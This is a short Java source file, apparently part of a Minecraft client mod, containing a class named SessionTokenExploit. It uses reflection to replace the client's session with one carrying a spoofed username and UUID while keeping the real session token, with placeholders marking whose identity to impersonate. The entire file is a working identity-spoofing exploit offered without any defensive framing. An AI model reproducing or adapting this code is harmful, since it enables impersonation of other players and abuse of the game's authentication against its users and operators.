package net.jan.ste.core;

import net.minecraft.client.Minecraft;
import net.minecraft.util.Session;

import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.UUID;

public class SessionTokenExploit {
    public static void setNewSession() {

        try {
            Field session = Arrays.stream(Minecraft.class.getDeclaredFields()).filter(f -> f.getType() == Session.class).findFirst().get();
            session.setAccessible(true);
            session.set(Minecraft.getMinecraft(), new Session(
                    "UsernameToSpoof",
                    getIdFromString("UUID-of-user-to-spoof").toString(),
                    Minecraft.getMinecraft().getSession().getToken(),
                    "mojang"
            ));
        } catch(Throwable t) {
            throw new RuntimeException(t);
        }
    }

    private static UUID getIdFromString(String uuid) {
        if (uuid.contains("-")) {
            return UUID.fromString(uuid);
        } else {
            return UUID.fromString(
                    uuid.replaceFirst(
                            "(\\p{XDigit}{8})(\\p{XDigit}{4})(\\p{XDigit}{4})(\\p{XDigit}{4})(\\p{XDigit}+)",
                            "$1-$2-$3-$4-$5"));
        }
    }
}
